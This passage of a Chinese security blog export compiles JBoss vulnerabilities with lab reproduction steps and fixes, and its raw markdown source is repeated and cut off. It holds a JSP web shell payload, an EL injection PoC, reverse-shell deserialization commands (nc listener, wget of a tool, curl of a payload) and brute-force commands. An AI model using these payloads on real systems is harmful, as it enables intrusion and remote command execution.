title=\"4.密码修改\"></a>4.密码修改</h5><p>可以参考CSRF漏洞。</p>\n<p>如果在最后确认修改的时候抓包多次重放，可以达到免验证来达到修改密码的作用。也就是这里并没有强制效验手机号和验证码。也就存在了任意修改密码的可能，当然要是效验了手机号和验证码的对应关系，也许就不可以了。</p>\n<p>当只是简单的重置的时候，先不谈越权问题，这个包都可能造成多次修改多次重置密码。而并不用验证。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /userpwd?p=2 HTTP/1.1</span><br><span class=\"line\">Host: xxx.com</span><br><span class=\"line\"></span><br><span class=\"line\">phone=1111111111&amp;code=123456&amp;pwd=123456&amp;newpwd=123456</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"5-条件竞争\"><a href=\"#5-条件竞争\" class=\"headerlink\" title=\"5.条件竞争\"></a>5.条件竞争</h5><p>条件竞争是后台对共享数据读写的时候，多线程没有对共享数据执行线程锁，导致在多个线程获取到的值并不是当前线程操作的实时值，典型的例子是，一份钱买多份。</p>\n<p>这类漏洞一般测试方式直接高并发进行检测即可；JMeter</p>\n<h4 id=\"漏洞修复\"><a href=\"#漏洞修复\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h4><ol>\n<li>添加图片验证码，为了应对偏爆破类的重放攻击，添加验证字段是最简单有效的手段。当然你要保证验证是在一次使用后及时失效。</li>\n<li>限制请求次数，有些地方并不适用于添加验证码，或者不能添加验证码。这时候针对同一账户的错误次数限制就显得很有必要。例如，当错误次数连续达到五次的时候，暂时十分钟内不能登陆。</li>\n<li>效验验证码和用户身份，某些重放攻击是利用了手机号和验证码之间的不对应性，特别是在修改密码等处，这时候需要把验证码和请求的用户手机号做联系，当重放或者越权的时候根据验证码次数和对应关系来判断是否允许修改。</li>\n</ol>\n"},{"title":"Jboss漏洞汇总","date":"2020-07-05T11:22:15.000Z","_content":"\nJBoss是一套开源的企业级 Java 中间件系统，用于实现基于 SOA 的企业应用和服务\n\nJBoss AS 开源社区版本，发布比较频繁。JBoss 7 ，先后发布了 7.0.0, 7.0.1, 7.0.2, 7.1.0, 7.1.1, 7.1.2, 7.1.3, 7.2.0，其中 7.1.1 比较经典，7.2.0 是 JBoss EAP 6.1 的基础zhi，但7.1.2, 7.1.3, 7.2.0 只是源代码打了 Tag，并没提供开放下载。\n\nJBoss EAP（Enterprise Application Platform） 在开源版本上构建的企业版本，目前Redhat 已经将 JBoss EAP 放在 JBoss.org 开放下载，开发人无需注册 Redhat （之前是必须有 Redhat.com 账号才能下载 JBoss EAP）。\n\nWildfly 是 JBoss AS 新的项目名称，从 8 开始，新的 JBoss AS 正式有一个名字，叫 WildFly， 目前已经发布 8 Beta 版本，针对开发人员的 Java EE 7 功能已经完全实现。\n\n### 环境搭建\n\n#### jdk安装\n\n```shell\nhttps://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html\n```\n\n![image-20200629230736581](/images/Jboss/image-20200629230736581.png)\n\n```shell\n# mkdir /usr/java\n# cp jdk-6u32-linux-x64-rpm.bin /usr/java/\n# chmod +x jdk-6u32-linux-x64-rpm.bin\n# ./jdk-6u32-linux-x64-rpm.bin\n# ls\ndefault                     latest                                 sun-javadb-demo-10.6.2-1.1.i386.rpm\njdk1.6.0_32                 sun-javadb-client-10.6.2-1.1.i386.rpm  sun-javadb-docs-10.6.2-1.1.i386.rpm\njdk-6u32-linux-amd64.rpm    sun-javadb-common-10.6.2-1.1.i386.rpm  sun-javadb-javadoc-10.6.2-1.1.i386.rpm\njdk-6u32-linux-x64-rpm.bin  sun-javadb-core-10.6.2-1.1.i386.rpm\n# vi /etc/profile\nexport JAVA_HOME=/usr/java/jdk1.6.0_32\nexport CLASSPATH=.:$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar\nexport PATH=$JAVA_HOME/bin:$PATH\n# source /etc/profile\n# java -version\njava version \"1.6.0_32\"\nJava(TM) SE Runtime Environment (build 1.6.0_32-b05)\nJava HotSpot(TM) 64-Bit Server VM (build 20.7-b02, mixed mode)\nOK\n//也可以使用yum进行安装jdk\n# yum -y list java*\t\t\t//会列出所有jdk版本信息\n//安装指定jdk\n# yum -y install java-1.7.0-openjdk*\n# java -version\njava version \"1.7.0_261\"\nOpenJDK Runtime Environment (rhel-2.6.22.2.el7_8-x86_64 u261-b02)\nOpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode)\n```\n\n#### JBoss版本\n\n```shell\n//JBoss全版本下载\nhttps://jbossas.jboss.org/downloads\nhttps://teddysun.com/260.html\n//6.0版本\nhttps://sourceforge.net/projects/jboss/files/JBoss/JBoss-6.0.0.Final/\n//4.2.3版本\nhttp://sourceforge.net/projects/jboss/files/JBoss/JBoss-4.2.3.GA/jboss-4.2.3.GA.zip/download\n```\n\n版本6.0\n\nJBoss-6.0.0.Final\n\n![image-20200629174602625](/images/Jboss/image-20200629174602625.png)\n\n#### JBoss安装\n\n```shell\n# unzip jboss-as-distribution-6.0.0.Final.zip\n# ll\n# 版本替换须重启系统，以免无法访问最新替换系统。或启动run时报错。\n# vim /etc/profile\nexport JBOSS_HOME=/usr/local/jboss-6.0.0.Final/\nexport PATH=$PATH:$JBOSS_HOME/bin\n# source /etc/profile\n//启动\n# ./run.sh -b 0.0.0.0\n//curl请求尝试\n# curl -I http://127.0.0.1:8080/\nHTTP/1.1 200 OK\nServer: Apache-Coyote/1.1\nX-Powered-By: Servlet/3.0; JBossAS-6\nAccept-Ranges: bytes\nETag: W/\"1554-1293496144000\"\nLast-Modified: Tue, 28 Dec 2010 00:29:04 GMT\nContent-Type: text/html\nContent-Length: 1554\nDate: Tue, 30 Jun 2020 12:22:53 GMT\n//关闭本地防火墙防止无法访问\n# systemctl stop firewalld.service\n```\n\n![image-20200630134941050](/images/Jboss/image-20200630134941050.png)\n\n#### JavaDeserH2HC\n\n此工具主要用于检测和测试反序列化类漏洞，项目地址已经贴到下面。\n\n[JavaDeserH2HC](https://github.com/joaomatosf/JavaDeserH2HC)\n\n### 漏洞分类实战\n\n#### CVE-2006-5750\n\n##### 漏洞描述\n\nCVE-2007-1036漏洞相同，CVE-2006-5750漏洞利用methodIndex进行store()方法的调用。其中methodIndex是通过方法的编号进行调用。\n\n##### 影响范围\n\n##### 漏洞原理\n\n##### 漏洞检测\n\n##### 漏洞修复\n\n1、参考CVE-2010-0738漏洞\n\n#### CVE-2007-1036\n\nJMX Console HtmlAdaptor Getshell\n\n##### 漏洞描述\n\n由于JBoss对 /jmx-console/HtmlAdaptor 路径未做任何认证措施，导致这个服务完全对外开放，可直接访问控制台部署shell。\n\n##### 影响范围\n\n全版本\n\n##### 漏洞原理\n\n此漏洞主要是由于JBoss中/jmx-console/HtmlAdaptor路径对外开放，并且没有任何身份验证机制，导致攻击者可以进入到jmx控制台，并在其中执行任何功能。\n\n##### 漏洞实战\n\n1、URL访问\n\n```shell\nhttp://172.16.144.135:8080/jmx-console/\n```\n\n![image-20200630141919387](/images/Jboss/image-20200630141919387.png)\n\n2、创建war包木马\n\n```shell\n➜  jsp jar -cvf muma.war shell.jsp\n```\n\n3、部署远程木马\n\n```\n部署远程war必须确保war提供web能够访问否则怎么叫远程部署呢？\n```\n\n![image-20200630143911494](/images/Jboss/image-20200630143911494.png)\n\n![image-20200630143935231](/images/Jboss/image-20200630143935231.png)\n\n<center>部署完成结果</center>\n4、访问木马\n\n```shell\nhttp://172.16.144.135:8080/muma/shell.jsp\n//如出现500即为部署成功只是无法解析\n```\n\n![image-20200630144229517](/images/Jboss/image-20200630144229517.png)\n\n5、管理工具连接\n\n![image-20200630144201038](/images/Jboss/image-20200630144201038.png)\n\n##### 漏洞修复\n\n因jboss默认未设置密码，导致jmx-console可远程部署war并导致被攻击。\n\n1、开启安全配置\n\n```shell\n//注释去掉(6.x版本修改下面文件)\n/usr/local/jboss-6.0.0.Final/common/deploy/jmx-console.war/WEB-INF/jboss-web.xml\n//4.x版本修改下面文件\n/server/default/deploy/jmx-console.war/WEB-INF/jboss-web.xml\n```\n\n![image-20200630145646406](/images/Jboss/image-20200630145646406.png)\n\n2、web.xml配置\n\n```shell\n/usr/local/jboss-6.0.0.Final/common/deploy/jmx-console.war/WEB-INF/web.xml\n```\n\n![image-20200630145856647](/images/Jboss/image-20200630145856647.png)\n\n3、设置账号及密码\n\n```shell\n//修改账号及密码（默认是admin/admin）\nserver/default/conf/props/jmx-console-users.properties\n```\n\n![image-20200630150052719](/images/Jboss/image-20200630150052719.png)\n\n4、访问\n\n````shell\n//修改以上配置后记得重启Jboss\n//直接停止run.sh\n//进程查看\n# ps aux | grep jboss\n# kill -9 PID\n````\n\n![image-20200630150711860](/images/Jboss/image-20200630150711860.png)\n\n#### CVE-2010-0738\n\n##### 漏洞描述\n\nJBoss默认仅对“GET”和“POST”方法启用安全限制。\n\n使用“HEAD”等其他HTTP方法发出请求，可以绕过身份验证，直接调用jmx-console实现的任何功能。\n\n注意：如果JMX控制台回复HTTP 500错误，则表示请求已正确处理。\n\n##### 影响范围\n\nJBossAS < 4.3\n\n##### 漏洞原理\n\nJBoss默认仅对“GET”和“POST”方法启用安全限制；使用“HEAD”等其他HTTP方法发出请求，可以绕过身份验证\n\n```shell\njboss-4.2.3.GA/server/default/deploy/jmx-console.war/WEB-INF/web.xml\n```\n\n![image-20200701103827156](/images/Jboss/image-20200701103827156.png)\n\n##### 漏洞检测\n\n1、URL请求\n\n```shell\nhttp://172.16.144.139:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.admin:service=DeploymentFileRepository\n```\n\n![image-20200701142719465](/images/Jboss/image-20200701142719465.png)\n\n2、参数对应值\n\n```shell\n# 路径\nshell.war\n# 文件名\nshell\n# 文件后缀\n.jsp\n# 文件内容\n<%Runtime.getRuntime().exec(request.getParameter(\"i\"));%>\n\n# 如POST提交需认证，修改请求方法未HEAD并复制POST数据至URL处\naction=invokeOp&name=jboss.admin:service=DeploymentFileRepository&methodIndex=6&arg0=../jmx-console.war/&arg1=shell&arg2=.jsp&arg3=<%Runtime.getRuntime().exec(request.getParameter(\"i\"));%>&arg4=True\n# 访问(获取当前目录文件夹及文件)\nhttp://172.16.144.139:8080/jmx-console/shell.jsp?i=touch%201.txt\n```\n\n![image-20200701153249170](/images/Jboss/image-20200701153249170.png)\n\n![image-20200701152708158](/images/Jboss/image-20200701152708158.png)\n\n3、shell新建文件\n\n```shell\nhttp://172.16.144.139:8080/shell/shell.jsp?i=touch%201.txt\n```\n\n![image-20200701152747850](/images/Jboss/image-20200701152747850.png)\n\n![image-20200701152836122](/images/Jboss/image-20200701152836122.png)\n\n##### 漏洞修复\n\n1、升级最新版本\n\n2、设置登录认证(参考CVE-2007-1036修复)\n\n#### CVE-2010-1871\n\n##### 漏洞描述\n\n`JBossSeam`是一个`JavaEE5`框架，把JSF与`EJB3.0`组件合并在一起，从而为开发基于Web的企业应用程序提供一个最新的模式。\n\n`JBossSeam`处理某些参数化`JBossEL`表达式的方式存在输入过滤漏洞。如果远程攻击者能够诱骗通过认证的`JBossSeam`用户访问特制的网页，就可能导致执行任意代码。\n\n##### 影响范围\n\nJBoss AS = 4.3.0（4.3.0属于企业版，导致部分环境没法搭建复现）\n\n```shell\n//4.3.0等版本下载\nhttp://ftp.riken.jp/Linux/redhat/ftp.redhat.com/jboss/eap/4.3.0/en/source/\n```\n\n##### 漏洞原理\n\n漏洞是通过`seam`组件中插入`#{payload}`进行模板注入，通过Java反射机制来获取到（`Java.lang.Runtime.getRuntime().exec()`方法），从而可以传入任何想要执行的命令。\n\n##### 漏洞检测\n\n1、漏洞位置描述\n\n漏洞是通过seam组件中插入#{payload}进行模板注入，可以在以下链接中插入要执行的方法，通过Java反射机制来获取到（`Java.lang.Runtime.getRuntime().exec()`方法）,从而可以传入任何想要执行的命令。\n\n```shell\n/admin-console/login.seam?actionOutcome=/success.xhtml?user%3d%23{}的#{}\n```\n\n2、PoC\n\ncmd代表传入的远程命令。在`/admin-console/login.seam`路径下，POST传入构造好的`payload`，即可对此漏洞利用。\n\n```java\nactionOutcome=/success.xhtml?user%3d%23{expressions.getClass().forName('Java.lang.Runtime').getDeclaredMethod('getRuntime').invoke(expressions.getClass().forName('Java.lang.Runtime')).exec(cmd)}\n```\n\n##### 漏洞修复\n\n1、补丁修复\n\n#### CVE-2013-4810\n\n##### 漏洞描述\n\n此漏洞和`CVE-2015-7501`漏洞原理相同，两者的区别就在于两个漏洞选择的进行其中`JMXInvokerServlet`和`EJBInvokerServlet`利用的是`org.jboss.invocation.MarshalledValue`进行的反序列化操作，\n\n而`web-console/Invoker`利用的是`org.jboss.console.remote.RemoteMBeanInvocation`进行反序列化并上传构造好文件。\n\n##### 影响范围\n\nJBoss AS 6.X\n\n##### 漏洞原理\n\n\n\n##### 漏洞检测\n\n1、参考CVE-2015-7501\n\n```\n//漏洞路径\n/invoker/EJBInvokerServlet\nhttp://172.16.144.157:8080/invoker/EJBInvokerServlet\n```\n\n![image-20200702153308520](/images/Jboss/image-20200702153308520.png)\n\n2、反弹shell\n\n直接参考CVE-2015-7501\n\n##### 漏洞修复\n\n1、[补丁](https://access.redhat.com/security/cve/cve-2015-7501)\n\n#### CVE-2015-7501\n\n##### 漏洞描述\n\n由于`JBoss`中`invoker/JMXInvokerServlet`路径对外开放，JBoss的`jmx`组件⽀持Java反序列化导致产生漏洞。\n\n##### 影响范围\n\nJBoss AS 6.x\n\n##### 漏洞原理\n\n由于`JBoss`中`invoker/JMXInvokerServlet`路径对外开放\n\n##### 漏洞检测\n\n1、PoC\n\n浏览器直接访问域名，如出现下载文档即可确定存在漏洞。\n\n```\nhttp://172.16.144.156:8080/invoker/JMXInvokerServlet\n```\n\n![image-20200702122358123](/images/Jboss/image-20200702122358123.png)\n\n2、反弹shell\n\n```shell\n# nc -lvnp 5555(攻击主机执行监听)\n//攻击主机目录下下载\n# wget http://scan.javasec.cn/java/JavaDeserH2HC.zip\n# unzip JavaDeserH2HC.zip\n# cd JavaDeserH2HC(以下命令均在攻击主机目录下执行，执行java生成序列化数据)\n# javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java\n# java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 172.16.144.157:5555\t\t\t\t(攻击主机及端口号)\n# curl http://172.16.144.157:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser\n```\n\n![image-20200702134459047](/images/Jboss/image-20200702134459047.png)\n\n##### 漏洞修复\n\n1、[补丁](https://access.redhat.com/security/cve/cve-2015-7501)\n\n#### CVE-2017-7504\n\n##### 漏洞描述\n\nJBoss AS 4.x及之前版本中，JbossMQ实现过程的`JMS over HTTP Invocation Layer`的\nHTTPServerILServlet.java⽂件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利⽤\n该漏洞执⾏任意代码。\n\n##### 影响范围\n\nJBoss AS 4.x之前版本\n\n##### 漏洞原理\n\nJBoss AS 4.x及之前版本中，JbossMQ实现过程的`JMS over HTTP Invocation Layer`的\nHTTPServerILServlet.java⽂件存在反序列化漏洞。\n\n##### 漏洞检测\n\n1、PoC\n\n访问域名，如出现以下返回可能存在漏洞。\n\n```\n172.16.144.157:8080/jbossmq-httpil/HTTPServerILServlet\n```\n\n![image-20200702140433362](/images/Jboss/image-20200702140433362.png)\n\n2、反弹shell\n\n```shell\n# nc -lvnp 6666(攻击主机执行监听)\n//攻击主机目录下下载\n# wget http://scan.javasec.cn/java/JavaDeserH2HC.zip\n# unzip JavaDeserH2HC.zip\n# cd JavaDeserH2HC(以下命令均在攻击主机目录下执行，执行java生成序列化数据)\n# javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java\n# java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 172.16.144.157:6666\t\t\t\t(攻击主机及端口号)\n# curl http://172.16.144.157:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser\n```\n\n![image-20200702142036913](/images/Jboss/image-20200702142036913.png)\n\n![image-20200702142043798](/images/Jboss/image-20200702142043798.png)\n\n##### 漏洞修复\n\n1、版本升级\n\n\n\n#### CVE-2017-12149\n\n##### 漏洞描述\n\n此漏洞主要是由于`jboss\\server\\all\\deploy\\httpha-invoker.sar\\invoker.war\\WEB-INF\\classes\\org\\jboss\\invocation\\http\\servlet`目录下的`ReadOnlyAccessFilter.class`文件中的`doFilter`方法，再将序列化传入`ois`中，并没有进行过滤便调用了`readObject()`进行反序列化，导致传入的携带恶意代码的序列化数据执行，造成了反序列化的漏洞。\n\n##### 影响范围\n\nJBossAS 5.x\n\nJBossAS 6.x\n\n##### 漏洞原理\n\n该漏洞存在于JBoss AS的HttpInvoker 组件中的ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。\n\n##### 漏洞检测\n\n1、版本确定\n\n![image-20200630152601209](/images/Jboss/image-20200630152601209.png)\n\n2、PoC访问\n\n````shell\nhttp://172.16.144.135:8080/invoker/readonly\n//如出现500可确定目标主机存在漏洞\n````\n\n![image-20200630152657545](/images/Jboss/image-20200630152657545.png)\n\n3、反弹shell\n\n```shell\n# nc -lvnp 8888(攻击主机执行监听)\n//攻击主机目录下下载\n# wget http://scan.javasec.cn/java/JavaDeserH2HC.zip\n# unzip JavaDeserH2HC.zip\n# cd JavaDeserH2HC(以下命令均在攻击主机目录下执行，执行java生成序列化数据)\n# javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java\n# java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 172.16.144.135:8888\t\t\t\t(攻击主机及端口号)\n# curl http://172.16.144.135:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser\n```\n\n![image-20200630221608353](/images/Jboss/image-20200630221608353.png)\n\n![image-20200630221503084](/images/Jboss/image-20200630221503084.png)\n\n##### 漏洞修复\n\n1、删除http-invoker.sar组件\n\n2、版本升级(此漏洞只存在AS5、AS6)\n\n#### Administration Console 弱口令\n\n##### 漏洞描述\n\n`Administration Console`存在默认密码`admin admin`,我们可以登录到后台部署war包`getshell`\n\n##### 影响范围\n\n全版本\n\n##### 漏洞原理\n\nJBoss默认Console是admin/admin.\n\n##### 漏洞检测\n\n1、访问以下URL\n\n```shell\nhttp://172.16.144.157:8080/jmx-console/\n```\n\n![image-20200702151249993](/images/Jboss/image-20200702151249993.png)\n\n2、远程部署war\n\n这部分直接参考`CVE-2007-1036`操作基本一致\n\n##### 漏洞修复\n\n1、修改默认账户及密码（足够强壮）\n\n#### JBoss >7.x弱口令及爆破\n\n##### 漏洞描述\n\n`jboss`从8开始正式更名为`WildFly` ,在`WildFly8`之后的版本添加控制台用户时默认就会执行强密码策略,所以相对于之前低版本的`jboss`,针对`WildFly`之后版本的弱口令推荐`wildPwn`自动化爆破工具。\n\n##### 漏洞范围\n\nJBoss >7.x（wildFly所需jdk版本为7及以上才行）\n\n##### 漏洞原理\n\nJBoss 8之后开始更名为`WildFly`其默认采用强密码策略，但也会存在可爆破风险。\n\n```shell\n//部署指定目录\n/usr/local/wildfly-8.0.0.Final\n//修改环境路径\nexport JBOSS_HOME=/usr/local/wildfly-8.0.0.Final/\nexport PATH=$PATH:$JBOSS_HOME/bin\n//添加新账户\n# ./add-user.sh\nWhat type of user do you wish to add?\n a) Management User (mgmt-users.properties)\n b) Application User (application-users.properties)\n(a): a\n\nEnter the details of the new user to add.\nUsing realm 'ManagementRealm' as discovered from the existing property files.\nUsername : admin\nThe username 'admin' is easy to guess\nAre you sure you want to add user 'admin' yes/no? yes\nPassword recommendations are listed below. To modify these restrictions edit the add-user.properties configuration file.\n - The password should not be one of the following restricted values {root, admin, administrator}\n - The password should contain at least 8 characters, 1 alphanumeric character(s), 1 digit(s), 1 non-alphanumeric symbol(s)\n - The password should be different from the username\nPassword :\nJBAS015269: Password must have at least 8 characters!\nAre you sure you want to use the password entered yes/no? yes\nRe-enter Password :\nWhat groups do you want this user to belong to? (Please enter a comma separated list, or leave blank for none)[  ]:\nAbout to add user 'admin' for realm 'ManagementRealm'\nIs this correct yes/no? yes\nAdded user 'admin' to file '/usr/local/wildfly-8.0.0.Final/standalone/configuration/mgmt-users.properties'\nAdded user 'admin' to file '/usr/local/wildfly-8.0.0.Final/domain/configuration/mgmt-users.properties'\nAdded user 'admin' with groups  to file '/usr/local/wildfly-8.0.0.Final/standalone/configuration/mgmt-groups.properties'\nAdded user 'admin' with groups  to file '/usr/local/wildfly-8.0.0.Final/domain/configuration/mgmt-groups.properties'\nIs this new user going to be used for one AS process to connect to another AS process?\ne.g. for a slave host controller connecting to the master or for a Remoting connection for server to server EJB calls.\nyes/no? yes\nTo represent the user add the following to the server-identities definition <secret value=\"dG9vcg==\" />\n\n//启动JBoss(静默启动，程序会在后台运行)\n# ./standalone.sh -Djboss.bind.address=0.0.0.0 -Djboss.bind.address.management=0.0.0.0&\n```\n\n##### 漏洞检测\n\n1、URL访问\n\n```shell\n//默认监听端口在9990\nhttp://172.16.144.158:9990/\n```\n\n![image-20200702202856723](/images/Jboss/image-20200702202856723.png)\n\n2、爆破\n\n```shell\n# git clone https://github.com/hlldz/wildPwn.git\n# cd wildPwn\n# python wildPwn.py -m brute --target 172.16.144.183 --port 8080 -user userList.txt -pass passList.txt\n\nnmap ‐n -Pn ‐‐script=wildfly‐brute.nse ‐‐script‐args \"userdb=userList.txt,passdb=pass.txt,hostname=domain.com\" 172.16.144.183 -p9990\n```\n\n貌似这个工具并没法实现爆破。\n\n##### 漏洞修复\n\n1、配置强口令\n\n2、限制来源IP\n\n### 总结\n\n以上CVE汇总根据网上各大佬汇总得到，其中部分CVE使用的`JavaDeserH2HC`工具已经在环境搭建部分贴出；还有很多其他工具请自行github或google了。\n\n### 参考\n\n```\nhttps://www.freebuf.com/articles/web/240174.html\nhttps://bugzilla.redhat.com/show_bug.cgi?id=615956\n```\n\n","source":"_posts/Jboss漏洞汇总.md","raw":"---\ntitle: Jboss漏洞汇总\ndate: 2020-07-05 19:22:15\ntags:\n - Jboss\n---\n\nJBoss是一套开源的企业级 Java 中间件系统，用于实现基于 SOA 的企业应用和服务\n\nJBoss AS 开源社区版本，发布比较频繁。JBoss 7 ，先后发布了 7.0.0, 7.0.1, 7.0.2, 7.1.0, 7.1.1, 7.1.2, 7.1.3, 7.2.0，其中 7.1.1 比较经典，7.2.0 是 JBoss EAP 6.1 的基础zhi，但7.1.2, 7.1.3, 7.2.0 只是源代码打了 Tag，并没提供开放下载。\n\nJBoss EAP（Enterprise Application Platform） 在开源版本上构建的企业版本，目前Redhat 已经将 JBoss EAP 放在 JBoss.org 开放下载，开发人无需注册 Redhat （之前是必须有 Redhat.com 账号才能下载 JBoss EAP）。\n\nWildfly 是 JBoss AS 新的项目名称，从 8 开始，新的 JBoss AS 正式有一个名字，叫 WildFly， 目前已经发布 8 Beta 版本，针对开发人员的 Java EE 7 功能已经完全实现。\n\n### 环境搭建\n\n#### jdk安装\n\n```shell\nhttps://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html\n```\n\n![image-20200629230736581](/images/Jboss/image-20200629230736581.png)\n\n```shell\n# mkdir /usr/java\n# cp jdk-6u32-linux-x64-rpm.bin /usr/java/\n# chmod +x jdk-6u32-linux-x64-rpm.bin\n# ./jdk-6u32-linux-x64-rpm.bin\n# ls\ndefault                     latest                                 sun-javadb-demo-10.6.2-1.1.i386.rpm\njdk1.6.0_32                 sun-javadb-client-10.6.2-1.1.i386.rpm  sun-javadb-docs-10.6.2-1.1.i386.rpm\njdk-6u32-linux-amd64.rpm    sun-javadb-common-10.6.2-1.1.i386.rpm  sun-javadb-javadoc-10.6.2-1.1.i386.rpm\njdk-6u32-linux-x64-rpm.bin  sun-javadb-core-10.6.2-1.1.i386.rpm\n# vi /etc/profile\nexport JAVA_HOME=/usr/java/jdk1.6.0_32\nexport CLASSPATH=.:$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar\nexport PATH=$JAVA_HOME/bin:$PATH\n# source /etc/profile\n# java -version\njava version \"1.6.0_32\"\nJava(TM) SE Runtime Environment (build 1.6.0_32-b05)\nJava HotSpot(TM) 64-Bit Server VM (build 20.7-b02, mixed mode)\nOK\n//也可以使用yum进行安装jdk\n# yum -y list java*\t\t\t//会列出所有jdk版本信息\n//安装指定jdk\n# yum -y install java-1.7.0-openjdk*\n# java -version\njava version \"1.7.0_261\"\nOpenJDK Runtime Environment (rhel-2.6.22.2.el7_8-x86_64 u261-b02)\nOpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode)\n```\n\n#### JBoss版本\n\n```shell\n//JBoss全版本下载\nhttps://jbossas.jboss.org/downloads\nhttps://teddysun.com/260.html\n//6.0版本\nhttps://sourceforge.net/projects/jboss/files/JBoss/JBoss-6.0.0.Final/\n//4.2.3版本\nhttp://sourceforge.net/projects/jboss/files/JBoss/JBoss-4.2.3.GA/jboss-4.2.3.GA.zip/download\n```\n\n版本6.0\n\nJBoss-6.0.0.Final\n\n![image-20200629174602625](/images/Jboss/image-20200629174602625.png)\n\n#### JBoss安装\n\n```shell\n# unzip jboss-as-distribution-6.0.0.Final.zip\n# ll\n# 版本替换须重启系统，以免无法访问最新替换系统。或启动run时报错。\n# vim /etc/profile\nexport JBOSS_HOME=/usr/local/jboss-6.0.0.Final/\nexport PATH=$PATH:$JBOSS_HOME/bin\n# source /etc/profile\n//启动\n# ./run.sh -b 0.0.0.0\n//curl请求尝试\n# curl -I http://127.0.0.1:8080/\nHTTP/1.1 200 OK\nServer: Apache-Coyote/1.1\nX-Powered-By: Servlet/3.0; JBossAS-6\nAccept-Ranges: bytes\nETag: W/\"1554-1293496144000\"\nLast-Modified: Tue, 28 Dec 2010 00:29:04 GMT\nContent-Type: text/html\nContent-Length: 1554\nDate: Tue, 30 Jun 2020 12:22:53 GMT\n//关闭本地防火墙防止无法访问\n# systemctl stop firewalld.service\n```\n\n![image-20200630134941050](/images/Jboss/image-20200630134941050.png)\n\n#### JavaDeserH2HC\n\n此工具主要用于检测和测试反序列化类漏洞，项目地址已经贴到下面。\n\n[JavaDeserH2HC](https://github.com/joaomatosf/JavaDeserH2HC)\n\n### 漏洞分类实战\n\n#### CVE-2006-5750\n\n##### 漏洞描述\n\nCVE-2007-1036漏洞相同，CVE-2006-5750漏洞利用methodIndex进行store()方法的调用。其中methodIndex是通过方法的编号进行调用。\n\n##### 影响范围\n\n##### 漏洞原理\n\n##### 漏洞检测\n\n##### 漏洞修复\n\n1、参考CVE-2010-0738漏洞\n\n#### CVE-2007-1036\n\nJMX Console HtmlAdaptor Getshell\n\n##### 漏洞描述\n\n由于JBoss对 /jmx-console/HtmlAdaptor 路径未做任何认证措施，导致这个服务完全对外开放，可直接访问控制台部署shell。\n\n##### 影响范围\n\n全版本\n\n##### 漏洞原理\n\n此漏洞主要是由于JBoss中/jmx-console/HtmlAdaptor路径对外开放，并且没有任何身份验证机制，导致攻击者可以进入到jmx控制台，并在其中执行任何功能。\n\n##### 漏洞实战\n\n1、URL访问\n\n```shell\nhttp://172.16.144.135:8080/jmx-console/\n```\n\n![image-20200630141919387](/images/Jboss/image-20200630141919387.png)\n\n2、创建war包木马\n\n```shell\n➜  jsp jar -cvf muma.war shell.jsp\n```\n\n3、部署远程木马\n\n```\n部署远程war必须确保war提供web能够访问否则怎么叫远程部署呢？\n```\n\n![image-20200630143911494](/images/Jboss/image-20200630143911494.png)\n\n![image-20200630143935231](/images/Jboss/image-20200630143935231.png)\n\n<center>部署完成结果</center>\n4、访问木马\n\n```shell\nhttp://172.16.144.135:8080/muma/shell.jsp\n//如出现500即为部署成功只是无法解析\n```\n\n![image-20200630144229517](/images/Jboss/image-20200630144229517.png)\n\n5、管理工具连接\n\n![image-20200630144201038](/images/Jboss/image-20200630144201038.png)\n\n##### 漏洞修复\n\n因jboss默认未设置密码，导致jmx-console可远程部署war并导致被攻击。\n\n1、开启安全配置\n\n```shell\n//注释去掉(6.x版本修改下面文件)\n/usr/local/jboss-6.0.0.Final/common/deploy/jmx-console.war/WEB-INF/jboss-web.xml\n//4.x版本修改下面文件\n/server/default/deploy/jmx-console.war/WEB-INF/jboss-web.xml\n```\n\n![image-20200630145646406](/images/Jboss/image-20200630145646406.png)\n\n2、web.xml配置\n\n```shell\n/usr/local/jboss-6.0.0.Final/common/deploy/jmx-console.war/WEB-INF/web.xml\n```\n\n![image-20200630145856647](/images/Jboss/image-20200630145856647.png)\n\n3、设置账号及密码\n\n```shell\n//修改账号及密码（默认是admin/admin）\nserver/default/conf/props/jmx-console-users.properties\n```\n\n![image-20200630150052719](/images/Jboss/image-20200630150052719.png)\n\n4、访问\n\n````shell\n//修改以上配置后记得重启Jboss\n//直接停止run.sh\n//进程查看\n# ps aux | grep jboss\n# kill -9 PID\n````\n\n![image-20200630150711860](/images/Jboss/image-20200630150711860.png)\n\n#### CVE-2010-0738\n\n##### 漏洞描述\n\nJBoss默认仅对“GET”和“POST”方法启用安全限制。\n\n使用“HEAD”等其他HTTP方法发出请求，可以绕过身份验证，直接调用jmx-console实现的任何功能。\n\n注意：如果JMX控制台回复HTTP 500错误，则表示请求已正确处理。\n\n##### 影响范围\n\nJBossAS < 4.3\n\n##### 